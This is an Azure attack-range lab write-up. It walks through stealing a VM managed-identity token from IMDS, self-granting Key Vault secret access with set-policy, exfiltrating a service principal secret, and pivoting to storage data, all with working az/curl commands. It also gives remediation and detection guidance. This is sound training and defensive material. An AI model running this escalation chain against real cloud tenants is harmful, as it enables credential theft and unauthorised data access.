# AP02 — Over-privileged Managed Identity → Key Vault secret → lateral movement

- **Layer:** Azure (Managed Identity · Key Vault · Storage)
- **Cost:** low — `Standard_B1s` VM (~7.6 USD/month) + standard public IP (~3.65 USD/month) + Key Vault/Storage for pennies; per session with `azrange.ps1 destroy`: ~0.05–0.20 USD. The only AP in the skeleton that bills compute → demands teardown discipline.
- **MITRE ATT&CK:** [T1552.005](https://attack.mitre.org/techniques/T1552/005/) (Unsecured Credentials: Cloud Instance Metadata API) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts) · [T1580](https://attack.mitre.org/techniques/T1580/) (Cloud Infrastructure Discovery) · [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation)
- **Maps to cert:** CARTP / CARTE
- **Precondition seeded by the range:**
  - Linux VM `azrange-ap02-web` (Ubuntu 22.04 LTS) with a **system-assigned managed identity** and initial access represented by a lab credential (admin + `random_password`, SSH/22 open on the NSG) — simulates a prior RCE/webshell.
  - The VM's MI holds **`Contributor` over the entire resource group `azrange-ap02-rg`** (deliberate excess privilege).
  - Key Vault `azrange-ap02-kv-<rand>` in the **access-policy** model (legacy), `purge_protection_enabled = false`, `soft_delete_retention_days = 7`, which safeguards the secret `automation-sp-secret` = the *client secret* of the service principal `azrange-ap02-automation`.
  - SP `azrange-ap02-automation` with **`Storage Blob Data Contributor`** over the storage account `azrangeap02data<rand>`, whose `loot` container holds the loot blob `flag.txt`.
  - Entirely wired by Terraform (`enable_ap02 = true`), 100% declarative — no post-deployment seed.

---

## 🎯 Learning objective

For the student to internalize that **a managed identity is not a safe: it is a bearer token bound to the host**, and that the real flaw is not the theft of the token (inevitable given RCE on the VM) but **the scope that token inherits**. The scenario demonstrates the canonical CARTP/CARTE chain: `VM → over-privileged MI → self-grant over Key Vault → theft of SP credential → reusable, broader-scope identity → data`. The conceptual hinge is that `Contributor` includes `Microsoft.KeyVault/vaults/accessPolicies/write`, so in an **access-policy** vault the MI itself can rewrite its own data-plane authorization and self-grant secret reads — a pivot that should not exist and that **disappears once the vault is migrated to RBAC**.

---

## 🔴 Exploit (how it is abused)

Training level. Public reference tooling: **az cli**, **MicroBurst** (`Get-AzPasswords`), **ROADtools**, **pacu**.

1. **Initial host access** (seeded by the range — represents a prior RCE/webshell). SSH to `azrange-ap02-web` with the lab credential declared in Terraform (port 22 open on the NSG):
   ```bash
   ssh <admin_username>@<ap02_vm_public_ip>
   ```

2. **MI reconnaissance.** Confirm that IMDS is reachable and that the VM has an assigned identity:
   ```bash
   curl -s -H 'Metadata: true' \
     'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | jq .compute
   # Shortcut (system-assigned, no client_id needed):
   az login --identity
   ```

3. **MI token theft (T1552.005).** The VM's authentication plane is **IMDS at `169.254.169.254`** (which *is* the Cloud Instance Metadata API). Two tokens are requested with the `Metadata: true` header, varying the `resource` parameter by target plane:
   ```bash
   # Token for ARM (enumerate and, later, the set-policy):
   curl -s -H 'Metadata: true' \
     'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

   # Token for the Key Vault data plane:
   curl -s -H 'Metadata: true' \
     'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'
   ```
   > **Teaching caveat — VM (IMDS) vs serverless (IDENTITY_ENDPOINT).** On a VM the token is obtained from IMDS (`169.254.169.254`). On App Service / Azure Functions **there is no IMDS**: the MI is consumed via the `IDENTITY_ENDPOINT` + `IDENTITY_HEADER` variables (`curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"`). That is why this AP maps cleanly to T1552.005 (metadata API), whereas the serverless case fits better under pure T1528.
   > **Defensive caveat.** The IMDS call **generates no telemetry of its own in Azure**: there is no log of the `GET` to the token endpoint. Detection relies on *downstream* events (vault AuditEvent, AzureActivity from the set-policy / role assignment) — see the 🔵 Detect section.

4. **Enumeration with the MI's identity (T1580 / T1078.004).** With the ARM token, inventory the RG and discover the vault and the storage account:
   ```bash
   az resource list -g azrange-ap02-rg -o table
   # → Key Vault azrange-ap02-kv-<rand> and storage azrangeap02data<rand>
   ```

5. **Self-grant / excess-privilege abuse (T1098).** The MI is `Contributor` over the RG and the vault is in **access-policy** mode with no data permission for the MI. `Contributor` includes `...accessPolicies/write`, so the MI rewrites the vault's own access policy to grant itself secret reads (classic CARTP technique):
   ```bash
   az keyvault set-policy --name azrange-ap02-kv-<rand> \
     --object-id <mi-principalId> \
     --secret-permissions get list
   ```

6. **Secret exfiltration (T1552.005).** Read the SP's *client secret*:
   ```bash
   az keyvault secret show --vault-name azrange-ap02-kv-<rand> \
     --name automation-sp-secret --query value -o tsv
   # REST equivalent (data plane, with the vault.azure.net token):
   # GET https://azrange-ap02-kv-<rand>.vault.azure.net/secrets/automation-sp-secret?api-version=7.4
   #      Authorization: Bearer <token-vault>
   ```

7. **Lateral movement to a second identity (T1078.004).** The secret does not yield data directly: it yields a **distinct, broader-scope identity**. Sign in as the SP `azrange-ap02-automation` — the jump from "ephemeral token bound to the host" to "reusable cloud-account credential":
   ```bash
   az login --service-principal -u <appId azrange-ap02-automation> \
     -p <secret> --tenant <tenantId>
   ```

8. **Trophy.** The SP holds `Storage Blob Data Contributor` over `azrangeap02data<rand>`. Downloading the loot proves the crossing of the trust boundaries `VM → MI → Key Vault → SP → data`:
   ```bash
   # Without --file, az dumps the blob contents to stdout (az >= 2.40):
   az storage blob download --account-name azrangeap02data<rand> \
     --container-name loot --name flag.txt --auth-mode login
   ```

---

## 🟢 Remediate (remediation)

1. **Least privilege on the MI.** Replace `Contributor` over the RG with the minimum permission over **the single secret** the host needs. The MI must never be able to rewrite its own authorization:
   ```powershell
   # Remove the excessive role assignment:
   Remove-AzRoleAssignment -ObjectId <mi-principalId> `
     -RoleDefinitionName "Contributor" `
     -Scope "/subscriptions/<sub>/resourceGroups/azrange-ap02-rg"

   # Grant secret read only (RBAC model, scoped to the vault):
   New-AzRoleAssignment -ObjectId <mi-principalId> `
     -RoleDefinitionName "Key Vault Secrets User" `
     -Scope "/subscriptions/<sub>/resourceGroups/azrange-ap02-rg/providers/Microsoft.KeyVault/vaults/azrange-ap02-kv-<rand>"
   ```

2. **Migrate the Key Vault from access-policy to RBAC** (`enable_rbac_authorization = true`). Under RBAC, `Contributor` alone grants **no** data-plane access **nor** the ability to self-assign data roles (that requires `User Access Administrator` or `Owner`). This eliminates the self-grant that makes the path exploitable:
   ```powershell
   Update-AzKeyVault -VaultName azrange-ap02-kv-<rand> `
     -ResourceGroupName azrange-ap02-rg -EnableRbacAuthorization $true
   ```

3. **Do not store long-lived secrets (SP client secrets) in Key Vault.** Prefer managed identities / workload identity federation. If the secret must exist: short rotation and RBAC-scoped data access.

4. **Segmentation / blast radius.** The low-value web host must not share an RG or scope with the Key Vault that safeguards automation credentials — separate by RG/subscription.

5. **Telemetry.** Enable the Key Vault's diagnostic settings (`AuditEvent` category → Log Analytics) and collect `AzureActivity`; alert on the `set-policy` (`VaultPatch` / `Microsoft.KeyVault/vaults/accessPolicies/write`) and on `Microsoft.Authorization/roleAssignments/write`:
   ```powershell
   $log = New-AzDiagnosticSettingLogSettingsObject -Category AuditEvent -Enabled $true
   New-AzDiagnosticSetting -ResourceId <kv-resourceId> -Name kv-audit-to-law `
     -WorkspaceId <law-id> -Log $log
   # az CLI equivalent:
   # az monitor diagnostic-settings create --name kv-audit-to-law \
   #   --resource <kv-resourceId> --workspace <law-id> \
   #   --logs '[{"category":"AuditEvent","enabled":true}]'
   ```

6. **Harden the host.** Do not expose port 22 to the Internet: restrict the NSG to management IPs or use Azure Bastion; limit egress and apply JIT.

7. **In the range:** `./azrange.ps1 reset` (equivalent to `terraform apply` with `-var enable_ap02=false`) re-applies the declared state and **reverts the access policy the attacker modified outside Terraform**. Manual alternative: `az keyvault delete` + `az keyvault purge`.

> **Teardown warning.** If during the exercise you manually escalate to `Contributor` at **subscription** scope, that role assignment **is not managed by Terraform** and must be cleaned up by hand.

---

## 🔵 Detect

The IMDS call leaves no log; the telltale events are **downstream**, in the **Key Vault Audit Logs** (`VaultPatch` from the set-policy / `SecretGet` of the secret) and in **AzureActivity** (`Microsoft.KeyVault/vaults/accessPolicies/write` from the set-policy and `Microsoft.Authorization/roleAssignments/write` from the `Contributor` grant).

- KQL (Sentinel / Defender XDR): [`detections/kql/AP02-managed-identity.kql`](../../detections/kql/AP02-managed-identity.kql)
- Sigma: [`detections/sigma/AP02-managed-identity.yml`](../../detections/sigma/AP02-managed-identity.yml)

Complementary hunting signals:
- **`OperationName == "VaultPatch"` in `AzureDiagnostics` (Key Vault AuditEvent) — or `Microsoft.KeyVault/vaults/accessPolicies/write` in `AzureActivity` — whose initiating identity is a managed identity** — an MI rewriting the access policy of the vault it lives in is almost always a self-grant.
- Tight temporal sequence: `set-policy` → `SecretGet` of `automation-sp-secret` by the same `objectId`, followed by an SP `az login` and accesses to `azrangeap02data<rand>`.
- `Microsoft.Authorization/roleAssignments/write` granting `Contributor` to a compute identity (provisioning anomaly).
- Authentication of the SP `azrange-ap02-automation` from an IP/ASN other than the host's or the legitimate pipeline's (credential reused after theft).
- Access to blobs in the `loot` container with `--auth-mode login` by an SP that does not normally touch that storage.

---

## 📚 References

- Microsoft — [Azure Instance Metadata Service (IMDS) — acquire an access token](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)
- Microsoft — [Migrate a Key Vault from access policies to RBAC](https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-migration)
- Microsoft — [Azure built-in roles: Key Vault Secrets User](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#key-vault-secrets-user)
- Microsoft — [Monitor Key Vault with diagnostic logs](https://learn.microsoft.com/en-us/azure/key-vault/general/logging)
- MITRE ATT&CK — T1552.005, T1078.004, T1580, T1098
